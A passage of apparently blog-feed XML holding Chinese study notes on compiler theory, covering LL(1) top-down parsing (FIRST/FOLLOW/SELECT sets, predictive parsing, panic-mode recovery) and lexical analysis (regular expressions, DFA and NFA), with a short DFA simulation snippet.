src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_Vo0rpE0IYj.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_GzeEns7wrr.png"></p><h3 id="2-2-1-提取左公因子算法"><a href="#2-2-1-提取左公因子算法" class="headerlink" title="2.2.1 提取左公因子算法"></a>2.2.1 提取左公因子算法</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_93dVEWdjQl.png"></p><hr><h1 id="3-LL-1-文法"><a href="#3-LL-1-文法" class="headerlink" title="3 LL(1)文法"></a>3 LL(1)文法</h1><h2 id="3-1-S-文法"><a href="#3-1-S-文法" class="headerlink" title="3.1 S_文法"></a>3.1 S_文法</h2><p><strong>预测分析法的工作过程</strong>：</p><p>从文法开始符号出发，在每一步推导过程中根据当前句型的最左非终结符$A$和当前输入符号$a$，选择正确的A-产生式。</p><p>为保证分析的确定性，选出的候选式必须是唯一的。</p><p>S_文法是一种简单的确定性文法，要求如下：</p><ol><li>每个产生式的右部都以终结符开始</li><li>同一非终结符的各个候选式的首终结符都不同</li><li>S_文法不含 $ε$ 产生式</li></ol><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_BiGMcHKJvR.png"></p><h2 id="3-2-非终结符的后继符号集"><a href="#3-2-非终结符的后继符号集" class="headerlink" title="3.2 非终结符的后继符号集"></a>3.2 非终结符的后继符号集</h2><p>可能在某个句型中紧跟在$A$后边的终结符$a$的集合，记为$FOLLOW(A)$。</p><p>$$<br>    \mathrm{FOLLOW}(A) &#x3D; \{ a \mid S\Rightarrow^*\alpha Aa\beta, a \in V_T,\alpha, \beta\in(V_T\cup V_N)^* \}<br>$$</p><p>如果 $A$ 是某个句型的最右符号，则将结束符“\$”添加到 $FOLLOW(A)$ 中。</p><h2 id="3-3-产生式的可选集"><a href="#3-3-产生式的可选集" class="headerlink" title="3.3 产生式的可选集"></a>3.3 产生式的可选集</h2><p>产生式$A→β$的可选集是指可以选用该产生式进行推导时对应的输入符号的集合，记为$SELECT(A→β)$。</p><ul><li>$\operatorname{SELECT}(A \rightarrow a \beta)&#x3D;{a}$</li><li>$\operatorname{SELECT}(A \rightarrow \varepsilon)&#x3D;F O L L O W(A)$</li></ul><h2 id="3-4-q-文法"><a href="#3-4-q-文法" class="headerlink" title="3.4 q_文法"></a>3.4 q_文法</h2><ol><li>每个产生式的右部或为$ε$，或以终结符开始</li><li>具有相同左部的产生式有不相交的可选集</li></ol><p>q_文法不含右部以非终结符开始的产生式。</p><h2 id="3-5-串首终结符集"><a href="#3-5-串首终结符集" class="headerlink" title="3.5 串首终结符集"></a>3.5 串首终结符集</h2><p>串首终结符集：串首第一个符号，并且是终结符，简称首终结符。</p><p>给定一个文法符号串$α$，$α$的串首终结符集$FIRST(α)$被定义为可以从$α$推导出的所有串首终结符构成的集合。</p><p>如果$α ⇒* ε$，那么$ε$也在$FIRST(α)$中。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_ydF5aeqvoD.png"></p><h3 id="3-5-1-计算文法符号X的FIRST-X"><a href="#3-5-1-计算文法符号X的FIRST-X" class="headerlink" title="3.5.1 计算文法符号X的FIRST(X)"></a>3.5.1 计算文法符号X的FIRST(X)</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_O7vmrG3O8m.png"></p><h3 id="3-5-2-算法"><a href="#3-5-2-算法" class="headerlink" title="3.5.2 算法"></a>3.5.2 算法</h3><p>不断应用下列规则，直到没有新的终结符$ε$可以被加入到任何$FIRST$集合中为止：</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_3dS2E65fb5.png"></p><h3 id="3-5-3-计算非终结符A的FOLLOW-A"><a href="#3-5-3-计算非终结符A的FOLLOW-A" class="headerlink" title="3.5.3 计算非终结符A的FOLLOW(A)"></a>3.5.3 计算非终结符A的FOLLOW(A)</h3><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_AjwPYJkJX6.png"></p><h3 id="3-5-4-算法"><a href="#3-5-4-算法" class="headerlink" title="3.5.4 算法"></a>3.5.4 算法</h3><p>不断应用下列规则，直到没有新的终结符可以被加入到任何$FOLLOW$集合中为止：</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_JS7nPdtyYZ.png"></p><h2 id="3-6-产生式的可选集的重新定义"><a href="#3-6-产生式的可选集的重新定义" class="headerlink" title="3.6 产生式的可选集的重新定义"></a>3.6 产生式的可选集的重新定义</h2><p>产生式$A→β$的可选集是指可以选用该产生式进行推导时对应的输入符号的集合，记为$SELECT(A→β)$。</p><p>产生式$A→α$的可选集$SELECT$：</p><ul><li>如果 $ε∉FIRST(α)$, 那么$SELECT(A→α) &#x3D; FIRST(α)$</li><li>如果 $ε∈FIRST(α)$, 那么$SELECT(A→α)&#x3D;( FIRST(α)-{ε} )∪FOLLOW(A)$</li></ul><h2 id="3-7-LL-1-文法"><a href="#3-7-LL-1-文法" class="headerlink" title="3.7 LL(1)文法"></a>3.7 LL(1)文法</h2><p>一个上下文无关文法是LL(1)文法的充要条件是，对每个非终结符A的任意两个不同产生式A → α ，A → β ，满足：</p><p>$$<br>S E L E C T(A \rightarrow \alpha) \cap S E L E C T(A \rightarrow \beta)&#x3D;\Phi<br>$$</p><p>其中，α、 β不能同时⇒*ε。</p><p>即：<strong>同一非终结符的各个产生式的可选集互不相交</strong>。</p><ul><li>第一个“L”表示从左向右扫描输入</li><li>第二个“ L”表示产生最左推导</li><li>“1”表示在每一步中只需要向前看一个输入符号来决定语法分析动作</li></ul><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_E9Q2l1xcxN.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_tPjs5blkj9.png"></p><p>LL(1)文法的分析方法：</p><ol><li>递归的预测分析法（递归下降LL(1)分析）</li><li>非递归的预测分析法（表驱动的预测分析）</li></ol><hr><h1 id="4-递归的预测分析法"><a href="#4-递归的预测分析法" class="headerlink" title="4 递归的预测分析法"></a>4 递归的预测分析法</h1><p>递归的预测分析法是指：在递归下降分析中，根据预测分析表进行产生式的选择。</p><p>根据每个非终结符的产生式和LL(1)文法的预测分析表，为每个非终结符编写对应的过程。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_bh5IAj46sb.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_dNQbZhcUA7.png"></p><hr><h1 id="5-非递归的预测分析法"><a href="#5-非递归的预测分析法" class="headerlink" title="5 非递归的预测分析法"></a>5 非递归的预测分析法</h1><p>非递归的预测分析<strong>不需要</strong>为每个非终结符<strong>编写递归下降过程</strong>，而是根据预测分析表构造一个<strong>自动机</strong>，也叫<strong>表驱动的预测分析</strong>。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_YzsAzkxSK2.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_PV1h2aZxOV.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_mnYirnLaBD.png"></p><h2 id="5-1-递归vs非递归"><a href="#5-1-递归vs非递归" class="headerlink" title="5.1 递归vs非递归"></a>5.1 递归vs非递归</h2><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_jPlnisPdiJ.png"></p><h2 id="5-2-预测分析法实现步骤"><a href="#5-2-预测分析法实现步骤" class="headerlink" title="5.2 预测分析法实现步骤"></a>5.2 预测分析法实现步骤</h2><ol><li>构造文法</li><li>改造文法：消除二义性、消除左递归、消除回溯</li><li>求每个变量的FIRST集和FOLLOW集，从而求得每个候选式的SELECT集</li><li>检查是不是 LL(1) 文法。若是，构造预测分析表</li><li>对于递归的预测分析，根据预测分析表为每一个非终结符编写一个过程；对于非递归的预测分析，实现表驱动的预测分析算法</li></ol><hr><h1 id="6-预测分析中的错误处理"><a href="#6-预测分析中的错误处理" class="headerlink" title="6 预测分析中的错误处理"></a>6 预测分析中的错误处理</h1><p>两种情况下可以检测到错误：</p><ol><li>栈顶非终结符与当前输入符号在预测分析表对应项中的信息为空</li><li>栈顶的终结符和当前输入符号不匹配</li></ol><h2 id="6-1-恐慌模式"><a href="#6-1-恐慌模式" class="headerlink" title="6.1 恐慌模式"></a>6.1 恐慌模式</h2><p>忽略输入中的一些符号，直到输入中出现由设计者选定的同步词法单元(synchronizing token)集合中的某个词法单元。</p><p>其效果依赖于同步集合的选取。集合的选取应该使得语法分析器能从实际遇到的错误中快速恢复。例如可以把FOLLOW(A)中的所有终结符放入非终结符A的同步记号集合。</p><p>如果终结符在栈顶而不能匹配，一个简单的办法就是弹出此终结符。</p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_e1ptdczgek.png"></p><p><img src="/2024/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/image_1vA8sjscA3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理第3章：词法分析</title>
      <link href="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="1-词法分析程序的设计"><a href="#1-词法分析程序的设计" class="headerlink" title="1  词法分析程序的设计"></a>1  词法分析程序的设计</h1><h2 id="1-1-词法分析流程"><a href="#1-1-词法分析流程" class="headerlink" title="1.1 词法分析流程"></a>1.1 词法分析流程</h2><p>逐个读入源程序字符并按照构词规则切分成一系列单词（token）。</p><p>单词是语言中具有独立意义的最小单位，包括保留关键字、标识符、常量、运算符、标点符号、分界符等。</p><p>词法分析是编译过程中的一个阶段，在语法分析前进行，也可和语法分析结合在一起作为一遍，由语法分析程序调用词法分析程序来获得当前单词供语法分析使用。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_Iv8-XUTlin.png"></p><p>词法分析程序的主要任务及输出：</p><ol><li>读源程序，产生用二元组表示的单词符号</li><li>滤掉空格，跳过注释、换行符</li><li>记录源程序的行号，以便出错处理程序准确定位源程序的错误</li><li>宏展开等…</li></ol><hr><h1 id="2-正则表达式"><a href="#2-正则表达式" class="headerlink" title="2 正则表达式"></a>2 正则表达式</h1><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_dhT23JXZRd.png"></p><p>正则表达式（Regular Expression，RE）是一种用来描述正则语言的更紧凑的表示方法。</p><p>例如：$r &#x3D; a (a \mid b)^*  (\varepsilon \mid(. \mid \_ )(a \mid b)(a \mid b)^*)$</p><p>正则表达式可以由较小的正则表达式按照特定规则递归地构建。每个正则表达式 $r$ 定义（表示）一个语言，记为$L(r)$。</p><p>这个语言也是根据 $r$ 的子表达式所表示的语言递归定义的。</p><h2 id="2-1-正则表达式的定义"><a href="#2-1-正则表达式的定义" class="headerlink" title="2.1 正则表达式的定义"></a>2.1 正则表达式的定义</h2><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_vVi1poYUec.png"></p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_aWyUHZS-tD.png"></p><blockquote><p>C语言无符号整数的 RE</p></blockquote><p>十进制整数的RE：$(1|\ldots| 9)(0|\ldots| 9)^{*} \mid 0$</p><p>八进制整数的RE：$0(1|2| 3|4| 5|6| 7)(0|1| 2|3| 4|5|6|7)^{*}$</p><p>十六进制整数的RE：$0 x(1|\ldots| 9|a| \ldots|f| A|\ldots| F)(0|\ldots| 9|a| \ldots|f| A|\ldots| F)^{*}$</p><h2 id="2-2-正则语言"><a href="#2-2-正则语言" class="headerlink" title="2.2 正则语言"></a>2.2 正则语言</h2><p>可以用RE定义的语言叫做<strong>正则语言</strong>(regular language)或<strong>正则集合</strong>(regular set)。</p><h3 id="2-2-1-RE的代数定律"><a href="#2-2-1-RE的代数定律" class="headerlink" title="2.2.1 RE的代数定律"></a>2.2.1 RE的代数定律</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_2V0VLTvqBP.png"></p><p>正则文法与正则表达式等价：</p><ul><li>对任何正则文法 G，存在定义同一语言的正则表达式 r</li><li>对任何正则表达式 r，存在生成同一语言的正则文法 G</li></ul><hr><h1 id="3-正则定义"><a href="#3-正则定义" class="headerlink" title="3 正则定义"></a>3 正则定义</h1><p>正则定义（Regular Definition）是具有如下形式的定义序列：</p><p>$$<br>\begin{array}{c}d_{1} \rightarrow r_{1} \ d_{2} \rightarrow r_{2} \ \cdots \ d_{n} \rightarrow r_{n}\end{array}<br>$$</p><p>其中：</p><ul><li>每个 $d_i$ 都是一个新符号，它们都不在字母表 Σ 中，而且各不相同</li><li>每个 $r_i$ 是字母表$\Sigma \cup{d_{1}, d_{2}, \ldots, d_{i-1}}$上的正则表达式</li></ul><p>给一些 RE 命名，并在之后的 RE 中像使用字母表中的符号一样使用这些名字。</p><blockquote><p>例1：C语言中标识符的正则定义</p></blockquote><ul><li>$digit \rightarrow 0|1| 2|\ldots| 9$</li><li>$ letter \_ \rightarrow A|B| \ldots |Z| a|b| \ldots |z| \_  $</li><li>$id \rightarrow letter \_ (letter \_ |digit )^*$</li></ul><blockquote><p>例2：（整型或浮点型）无符号数的正则定义</p></blockquote><ul><li>$digit \rightarrow 0|1|2|…|9$</li><li>$digits \rightarrow digit\quad digit { }^{*}$</li><li>$optionalFraction \rightarrow.digits \mid \varepsilon$</li><li>$optionalExponent \rightarrow(E(+|-| \varepsilon) digits ) \mid \varepsilon$</li><li>$number \rightarrow digits \quad optionalFraction \quad optionalExponent$</li></ul><hr><h1 id="4-有穷自动机"><a href="#4-有穷自动机" class="headerlink" title="4 有穷自动机"></a>4 有穷自动机</h1><p>有穷自动机（Finite Automata，FA）由两位神经物理学家<code>MeCuloch</code>和Pitts于1948年首先提出，是对一类处理系统建立的数学模型。</p><p>这类系统具有一系列离散的输入输出信息和有穷数目的内部状态（状态：概括了对过去输入信息处理的状况）。</p><p>系统只需要根据当前所处的状态和当前面临的输入信息就可以决定系统的后继行为。每当系统处理了当前的输入后，系统的内部状态也将发生改变。</p><h2 id="4-1-FA模型"><a href="#4-1-FA模型" class="headerlink" title="4.1 FA模型"></a>4.1 FA模型</h2><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_jEUugDSLdG.png"></p><ul><li><strong>输入带</strong>（input tape）：用来存放输入符号串</li><li><strong>读头</strong>（head）：从左向右逐个读取输入符号，不能修改（只读）、不能往返移动</li><li><strong>有穷控制器</strong>（finite control）：具有有穷个状态数，根据当前的状态和当前输入符号控制转入下一状态</li></ul><h2 id="4-2-转换图"><a href="#4-2-转换图" class="headerlink" title="4.2 转换图"></a>4.2 转换图</h2><p>结点：FA的状态</p><ul><li>初始状态（开始状态）：只有一个，由start箭头指向</li><li>终止状态（接收状态）：可以有多个，用双圈表示</li></ul><p>带标记的有向边：如果对于输入$a$，存在一个从状态$p$到状态$q$的转换，就在$p$、$q$之间画一条有向边，并标记上$a$。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_DuZE9Yxn59.png"></p><h2 id="4-3-FA定义（接收）的语言"><a href="#4-3-FA定义（接收）的语言" class="headerlink" title="4.3 FA定义（接收）的语言"></a>4.3 FA定义（接收）的语言</h2><p>给定输入串$x$，如果存在一个对应于串$x$的从初始状态到某个终止状态的转换序列，则称符号串$x$被该FA接收。</p><p>由一个有穷自动机M接收的所有符号串构成的集合称为是该FA定义（或接收）的语言，记为$L(M)$。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_Fha7_BC36o.png"></p><ul><li>$L(M)$ &#x3D;所有以<code>abb</code>结尾的字母表$\{a, b\}$上的符号串的集合</li></ul><h3 id="4-3-1-最长子串匹配原则"><a href="#4-3-1-最长子串匹配原则" class="headerlink" title="4.3.1 最长子串匹配原则"></a>4.3.1 最长子串匹配原则</h3><p>当输入串的多个前缀与一个或多个模式匹配时，总是选择最长的前缀进行匹配。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_StcOS-UGEz.png"></p><p>在到达某个终态之后，只要输入带上还有符号，<code>DFA</code>就继续前进，以便寻找尽可能长的匹配。</p><hr><h1 id="5-有穷自动机的分类"><a href="#5-有穷自动机的分类" class="headerlink" title="5 有穷自动机的分类"></a>5 有穷自动机的分类</h1><p>FA的分类：</p><ol><li>确定的FA<code>(Deterministic finite automata, DFA)</code></li><li>非确定的FA<code>(Nondeterministic finite automata, NFA)</code></li></ol><h2 id="5-1-确定的有穷自动机-DFA"><a href="#5-1-确定的有穷自动机-DFA" class="headerlink" title="5.1 确定的有穷自动机 (DFA)"></a>5.1 确定的有穷自动机 (DFA)</h2><p>$$<br>M &#x3D; ( S，Σ ，δ，s_0，F )<br>$$</p><ul><li>$S$：有穷状态集</li><li>$Σ$：输入字母表，即输入符号集合。假设$ε$不是$Σ$中的元素</li><li>$δ$：将$S× Σ$映射到$S$的转换函数。 $\forall s \in S$，$a \in \Sigma$，$\delta(s, a)$表示从状态$s$出发，沿着标记为$a$的边所能到达的状态</li><li>$s_0$：开始状态 (或初始状态)，$s_0 \in S$</li><li>$F$：接收状态（或终止状态）集合，$F \subseteq S$</li></ul><h3 id="5-1-1-一个DFA"><a href="#5-1-1-一个DFA" class="headerlink" title="5.1.1 一个DFA"></a>5.1.1 一个DFA</h3><p>可以用转换表表示<code>DFA</code>。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_wq6LZ7ABM3.png"></p><h3 id="5-1-2-DFA的算法实现"><a href="#5-1-2-DFA的算法实现" class="headerlink" title="5.1.2 DFA的算法实现"></a>5.1.2 DFA的算法实现</h3><p><strong>输入</strong>：以文件结束符<code>eof</code>结尾的字符串x。<code>DFA</code>：D 的开始状态$s_0$，接收状态集 F，转换函数move</p><p><strong>输出</strong>：如果 D接收 x，则回答“yes”，否则回答“ no”</p><p><strong>方法</strong>：将下述算法应用于输入串 x</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = s0;</span><br><span class="line">c = <span class="built_in">nextChar</span>();</span><br><span class="line"><span class="keyword">while</span> (c! = eof) &#123;</span><br><span class="line">    s = <span class="built_in">move</span>(s, c);</span><br><span class="line">    c = <span class="built_in">nextChar</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (s在F中) <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;no;</span></span><br></pre></td></tr></table></figure><ul><li>函数<code>nextChar()</code>返回输入串x的下一个符号</li><li>函数<code>move(s, c)</code>表示从状态s出发，沿着标记为c的边所能到达的状态</li></ul><h2 id="5-2-非确定的有穷自动机-NFA"><a href="#5-2-非确定的有穷自动机-NFA" class="headerlink" title="5.2 非确定的有穷自动机(NFA)"></a>5.2 非确定的有穷自动机(NFA)</h2><p>$$<br>M &#x3D; ( S，Σ ，δ，s_0，F )<br>$$</p><ul><li>S：有穷状态集</li><li>Σ：输入字母表，即输入符号集合。假设ε不是Σ中的元素</li><li>δ：将S× Σ映射到$2^S$的转换函数。 $\forall s \in S$，$a \in \Sigma$，$\delta(s, a)$表示从状态s出发，沿着标记为a的边所能到达的集合</li><li>$s_0$：开始状态 (或初始状态)，$s_0 \in S$</li><li>F：接收状态（或终止状态）集合，$F \subseteq S$</li></ul><h3 id="5-2-1-一个-NFA"><a href="#5-2-1-一个-NFA" class="headerlink" title="5.2.1 一个 NFA"></a>5.2.1 一个 NFA</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_7jGQGOmrGu.png"></p><h2 id="5-3-DFA和NFA的等价性"><a href="#5-3-DFA和NFA的等价性" class="headerlink" title="5.3 DFA和NFA的等价性"></a>5.3 DFA和NFA的等价性</h2><ul><li>对任何<code>NFA</code>：N ，存在识别同一语言的<code>DFA</code>：D</li><li>对任何<code>DFA</code>：D ，存在识别同一语言的<code>NFA</code>：N</li></ul><blockquote><p>例如：$r&#x3D;(a|b)^*abb$</p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_N6V2O6YVut.png"></p><p>正则文法$\ce{&lt;-&gt;}$正则表达式$\ce{&lt;-&gt;}$FA</p><h2 id="5-4-带有“ε-边”的NFA"><a href="#5-4-带有“ε-边”的NFA" class="headerlink" title="5.4 带有“ε-边”的NFA"></a>5.4 带有“ε-边”的NFA</h2><p>$$<br>M &#x3D; ( S，Σ ，δ，s_0，F )<br>$$</p><ul><li>S：有穷状态集</li><li>Σ：输入字母表，即输入符号集合。假设ε不是Σ中的元素</li><li>δ：将$S \times(\Sigma \cup{\varepsilon})$映射到$2^S$的转换函数。 $\forall s \in S$，$a \in \Sigma \cup{\varepsilon}$，$\delta(s, a)$表示从状态s出发，沿着标记为a的边所能到达的集合</li><li>$s_0$：开始状态 (或初始状态)，$s_0 \in S$</li><li>F：接收状态（或终止状态）集合，$F \subseteq S$</li></ul><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_6HCGnirgX1.png"></p><h3 id="5-4-1-带有和不带-有“ε-边”的NFA-的等价性"><a href="#5-4-1-带有和不带-有“ε-边”的NFA-的等价性" class="headerlink" title="5.4.1 带有和不带 有“ε-边”的NFA 的等价性"></a>5.4.1 带有和不带 有“ε-边”的NFA 的等价性</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_26ZBsRNlXH.png"></p><hr><h1 id="6-从正则表达式到有穷自动机"><a href="#6-从正则表达式到有穷自动机" class="headerlink" title="6 从正则表达式到有穷自动机"></a>6 从正则表达式到有穷自动机</h1><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_sppCLdeypu.png"></p><h2 id="6-1-根据-RE-构造-NFA"><a href="#6-1-根据-RE-构造-NFA" class="headerlink" title="6.1 根据 RE 构造 NFA"></a>6.1 根据 RE 构造 NFA</h2><ul><li>ε对应的<code>NFA</code></li></ul><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_N0O3BSYjDI.png"></p><ul><li>字母表Σ中符号a对应的<code>NFA</code></li></ul><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_02CUmMaEjt.png"></p><p><img 